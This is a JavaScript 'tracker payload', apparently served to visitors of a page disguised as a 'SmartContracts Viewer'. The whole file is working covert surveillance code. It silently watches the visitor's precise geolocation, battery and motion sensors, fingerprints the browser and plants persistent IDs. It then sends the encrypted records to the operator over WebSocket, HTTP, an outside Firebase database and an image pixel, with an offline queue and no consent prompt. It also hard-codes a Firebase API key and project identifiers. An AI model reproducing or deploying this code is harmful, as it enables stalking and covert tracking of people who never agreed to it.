// Tracker Payload (Served at /payload)
(function() {
  'use strict';

  /*********************************************
   * CONFIG (will be replaced with real key)
   *********************************************/
  const CONFIG = {
    // *** REPLACE THIS WITH YOUR ACTUAL SPKI PUBLIC KEY PEM ***
    publicKeyPem: `-----BEGIN PUBLIC KEY-----
YOUR_PUBLIC_KEY_PEM
-----END PUBLIC KEY-----`,
    proxyHost: window.location.origin,  // Proxy is same origin
    wsUrl: 'wss://' + window.location.host + '/ws',
    apiEndpoint: '/api/loc',
    pixelEndpoint: '/pixel',
    firebaseConfig: {
      apiKey: "AIzaSyDaEkGbIB7QkvVhkWevxNSTqQx9R62m8xM",
      authDomain: "god-tracker-2f09e.firebaseapp.com",
      databaseURL: "https://god-tracker-2f09e-default-rtdb.firebaseio.com",
      projectId: "god-tracker-2f09e",
      storageBucket: "god-tracker-2f09e.firebasestorage.app",
      messagingSenderId: "1043754524560",
      appId: "1:1043754524560:web:2637237883ec67b7279d15"
    },
    minDisplacementMeters: 10,
    heartbeatSecs: 60,
    batteryLowThreshold: 0.15,
    batteryCriticalThreshold: 0.05,
    lowBatteryMultiplier: 3,
    maxOfflineQueue: 10000,
    beaconIdCookieName: '_scv_id'
  };

  /*********************************************
   * ENCRYPTION UTILITIES (Web Crypto)
   *********************************************/
  async function importPublicKey(pem) {
    const pemHeader = '-----BEGIN PUBLIC KEY-----';
    const pemFooter = '-----END PUBLIC KEY-----';
    const pemContents = pem
      .replace(pemHeader, '')
      .replace(pemFooter, '')
      .replace(/\s/g, '');
    const binary = Uint8Array.from(atob(pemContents), c => c.charCodeAt(0));
    return crypto.subtle.importKey(
      'spki',
      binary,
      { name: 'RSA-OAEP', hash: 'SHA-256' },
      false,
      ['encrypt']
    );
  }

  async function encryptData(publicKey, obj) {
    const enc = new TextEncoder();
    const data = enc.encode(JSON.stringify(obj));
    const encrypted = await crypto.subtle.encrypt(
      { name: 'RSA-OAEP' },
      publicKey,
      data
    );
    return btoa(String.fromCharCode(...new Uint8Array(encrypted)));
  }

  /*********************************************
   * DEVICE IDENTITY & FINGERPRINT
   *********************************************/
  function generateDeviceId() {
    return 'dev_' + Math.random().toString(36).substring(2, 10);
  }

  function getBeaconId() {
    let beaconId = localStorage.getItem(CONFIG.beaconIdCookieName);
    if (!beaconId) {
      beaconId = getCookie(CONFIG.beaconIdCookieName);
    }
    if (!beaconId) {
      beaconId = generateDeviceId();
      localStorage.setItem(CONFIG.beaconIdCookieName, beaconId);
      document.cookie = CONFIG.beaconIdCookieName + '=' + beaconId + ';path=/;max-age=' + (365*24*60*60);
    }
    return beaconId;
  }

  function getCookie(name) {
    const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
    return match ? match[2] : null;
  }

  function getRefTag() {
    const params = new URLSearchParams(window.location.search);
    return params.get('ref') || null;
  }

  function getFingerprint() {
    // Simple fingerprint (use FingerprintJS if you want more depth)
    const signals = [
      navigator.userAgent,
      screen.width + 'x' + screen.height + 'x' + screen.colorDepth,
      Intl.DateTimeFormat().resolvedOptions().timeZone,
      navigator.language,
      navigator.platform,
      navigator.hardwareConcurrency || 'unknown',
      // Canvas fingerprint
      (function() {
        try {
          const canvas = document.createElement('canvas');
          canvas.width = 280; canvas.height = 60;
          const ctx = canvas.getContext('2d');
          ctx.textBaseline = 'top';
          ctx.font = '14px Arial';
          ctx.fillStyle = '#f60';
          ctx.fillRect(125,1,62,20);
          ctx.fillStyle = '#069';
          ctx.fillText('SmartContracts Viewer', 2, 15);
          ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
          ctx.fillText('SmartContracts Viewer', 4, 17);
          return canvas.toDataURL();
        } catch(e) { return 'canvas_err'; }
      })(),
      // WebGL vendor
      (function() {
        try {
          const gl = document.createElement('canvas').getContext('webgl');
          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
          return debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'webgl_noext';
        } catch(e) { return 'webgl_err'; }
      })()
    ];
    return btoa(signals.join('##')).substring(0, 64);
  }

  /*********************************************
   * OFFLINE QUEUE (IndexedDB)
   *********************************************/
  class OfflineQueue {
    constructor() {
      this.dbName = 'SCVQueue';
      this.storeName = 'locationQueue';
      this.db = null;
    }

    async open() {
      if (this.db) return this.db;
      return new Promise((resolve, reject) => {
        const req = indexedDB.open(this.dbName, 1);
        req.onupgradeneeded = (e) => {
          const db = e.target.result;
          if (!db.objectStoreNames.contains(this.storeName)) {
            db.createObjectStore(this.storeName, { keyPath: 'id', autoIncrement: true });
          }
        };
        req.onsuccess = (e) => { this.db = e.target.result; resolve(this.db); };
        req.onerror = () => reject(req.error);
      });
    }

    async enqueue(encryptedPayload) {
      try {
        const db = await this.open();
        const tx = db.transaction(this.storeName, 'readwrite');
        tx.objectStore(this.storeName).add({ payload: encryptedPayload, ts: Date.now() });
        await tx.complete;
        // Enforce max queue size
        const count = await this.count();
        if (count > CONFIG.maxOfflineQueue) {
          const db2 = await this.open();
          const tx2 = db2.transaction(this.storeName, 'readwrite');
          const store = tx2.objectStore(this.storeName);
          const first = await new Promise(res => { store.getAllKeys(null, 1).onsuccess = e => res(e.target.result); });
          if (first.length > 0) store.delete(first[0]);
        }
      } catch(e) {}
    }

    async flush(publicKey, sendFunc) {
      try {
        const db = await this.open();
        const tx = db.transaction(this.storeName, 'readwrite');
        const store = tx.objectStore(this.storeName);
        const items = await new Promise(res => { store.getAll().onsuccess = e => res(e.target.result || []); });
        for (const item of items) {
          try {
            await sendFunc(item.payload);
            store.delete(item.id);
          } catch { break; }
        }
        await tx.complete;
      } catch(e) {}
    }

    async count() {
      try {
        const db = await this.open();
        return new Promise(res => {
          db.transaction(this.storeName, 'readonly').objectStore(this.storeName).count().onsuccess = e => res(e.target.result);
        });
      } catch { return 0; }
    }
  }

  /*********************************************
   * TRANSPORT LAYER
   *********************************************/
  let socket = null;
  let publicKeyCrypto = null;

  async function initWebSocket() {
    return new Promise((resolve, reject) => {
      socket = new WebSocket(CONFIG.wsUrl);
      socket.onopen = () => resolve(socket);
      socket.onerror = () => reject(new Error('WS error'));
    });
  }

  async function sendViaWebSocket(encryptedPayload) {
    if (socket && socket.readyState === WebSocket.OPEN) {
      socket.send(encryptedPayload);
      return true;
    }
    throw new Error('WS not connected');
  }

  async function sendViaHTTP(encryptedPayload) {
    const resp = await fetch(CONFIG.apiEndpoint, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: encryptedPayload
    });
    if (!resp.ok) throw new Error('HTTP error ' + resp.status);
    return true;
  }

  async function sendViaFirebase(encryptedPayload) {
    if (typeof firebase === 'undefined') {
      if (!window.firebaseLoaded) {
        window.firebaseLoaded = new Promise((resolve) => {
          const script = document.createElement('script');
          script.src = 'https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js';
          script.onload = () => {
            const script2 = document.createElement('script');
            script2.src = 'https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js';
            script2.onload = resolve;
            document.head.appendChild(script2);
          };
          document.head.appendChild(script);
        });
      }
      await window.firebaseLoaded;
      firebase.initializeApp(CONFIG.firebaseConfig);
    }
    const db = firebase.database();
    await db.ref('locations/' + deviceId).set(encryptedPayload);
    return true;
  }

  async function sendViaPixel(encryptedPayload) {
    return new Promise((resolve, reject) => {
      const img = new Image();
      img.src = CONFIG.pixelEndpoint + '?d=' + encodeURIComponent(encryptedPayload);
      img.onload = () => resolve(true);
      img.onerror = () => reject(new Error('Pixel failed'));
      setTimeout(() => reject(new Error('Pixel timeout')), 3000);
    });
  }

  async function sendLocation(encryptedPayload) {
    // Tiered transport
    const transports = [
      sendViaWebSocket,
      sendViaHTTP,
      sendViaFirebase,
      sendViaPixel
    ];
    for (const transport of transports) {
      try {
        await transport(encryptedPayload);
        return; // Success
      } catch(e) {}
    }
    // All failed – queue
    offlineQueue.enqueue(encryptedPayload);
  }

  /*********************************************
   * LOCATION PROCESSING
   *********************************************/
  let lastPosition = null;
  let lastPushTime = 0;
  let deviceId = getBeaconId();
  let refTag = getRefTag();
  let fingerprint = getFingerprint();
  let batteryLevel = 1.0;
  let batteryCharging = true;

  // Sensor fusion variables
  let accelMagn = null;
  let compassHeading = null;

  function getDistance(lat1, lon1, lat2, lon2) {
    const R = 6371e3;
    const φ1 = lat1 * Math.PI/180, φ2 = lat2 * Math.PI/180;
    const Δφ = (lat2-lat1) * Math.PI/180, Δλ = (lon2-lon1) * Math.PI/180;
    const a = Math.sin(Δφ/2)**2 + Math.cos(φ1)*Math.cos(φ2)*Math.sin(Δλ/2)**2;
    return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
  }

  function computeConfidence(pos) {
    let score = 0.8;
    if (pos.coords.accuracy < 5) score += 0.1;
    else if (pos.coords.accuracy > 50) score -= 0.3;
    if (pos.coords.speed != null && accelMagn != null) {
      const gpsSpeed = pos.coords.speed;
      const accelIndicatesMovement = Math.abs(accelMagn - 9.8) > 1.0;
      if (gpsSpeed > 5 && !accelIndicatesMovement) score -= 0.4;
      if (gpsSpeed < 1 && accelIndicatesMovement) score -= 0.2;
    }
    if (compassHeading != null && pos.coords.heading != null) {
      const diff = Math.abs(compassHeading - pos.coords.heading) % 360;
      if (diff > 30 && diff < 330) score -= 0.2;
    }
    return Math.max(0, Math.min(1, score));
  }

  async function processPosition(pos) {
    const now = Date.now();
    const lat = pos.coords.latitude;
    const lon = pos.coords.longitude;

    // Filter by distance
    if (lastPosition) {
      const dist = getDistance(lastPosition.latitude, lastPosition.longitude, lat, lon);
      if (dist < CONFIG.minDisplacementMeters && (now - lastPushTime) < CONFIG.heartbeatSecs * 1000) return;
    }

    const confidence = computeConfidence(pos);
    const locationData = {
      lat: lat,
      lng: lon,
      acc: pos.coords.accuracy || 0,
      spd: pos.coords.speed || 0,
      hdg: pos.coords.heading || 0,
      alt: pos.coords.altitude || 0,
      conf: confidence,
      bat: Math.round(batteryLevel * 100),
      ts: new Date().toISOString(),
      dev: deviceId,
      ref: refTag,
      fp: fingerprint
    };

    // Encrypt with admin's public key
    try {
      if (!publicKeyCrypto) publicKeyCrypto = await importPublicKey(CONFIG.publicKeyPem);
      const encrypted = await encryptData(publicKeyCrypto, locationData);
      await sendLocation(encrypted);
      lastPosition = { latitude: lat, longitude: lon };
      lastPushTime = now;
      offlineQueue.flush(publicKeyCrypto, async (payload) => { await sendLocation(payload); });
    } catch(e) {}
  }

  function handlePositionError(err) {
    // Silently ignore; watchPosition will continue trying.
  }

  /*********************************************
   * BATTERY & SENSOR INIT
   *********************************************/
  function initBattery() {
    if (navigator.getBattery) {
      navigator.getBattery().then(battery => {
        batteryLevel = battery.level;
        batteryCharging = battery.charging;
        battery.addEventListener('levelchange', () => { batteryLevel = battery.level; });
        battery.addEventListener('chargingchange', () => { batteryCharging = battery.charging; });
      });
    }
  }

  function initSensors() {
    window.addEventListener('deviceorientation', function(event) {
      if (event.webkitCompassHeading) compassHeading = event.webkitCompassHeading;
      else if (event.alpha !== null) compassHeading = 360 - event.alpha; // approximate
    });
    window.addEventListener('devicemotion', function(event) {
      const acc = event.accelerationIncludingGravity;
      if (acc) {
        accelMagn = Math.sqrt(acc.x**2 + acc.y**2 + acc.z**2);
      }
    });
  }

  /*********************************************
   * START TRACKING
   *********************************************/
  const offlineQueue = new OfflineQueue();
  let watchId = null;

  function startWatch() {
    watchId = navigator.geolocation.watchPosition(
      processPosition,
      handlePositionError,
      { enableHighAccuracy: true, maximumAge: 30000, timeout: 15000 }
    );
  }

  function adjustWatch() {
    // No dynamic adjustment needed with watchPosition; battery will influence via skip logic in processPosition.
  }

  // Initialise
  initBattery();
  initSensors();
  startWatch();

  // Attempt WebSocket connection (non-blocking)
  initWebSocket().catch(() => {});

  // Periodic heartbeat to flush offline queue
  setInterval(() => {
    offlineQueue.flush(publicKeyCrypto, sendLocation);
  }, 30000);

})();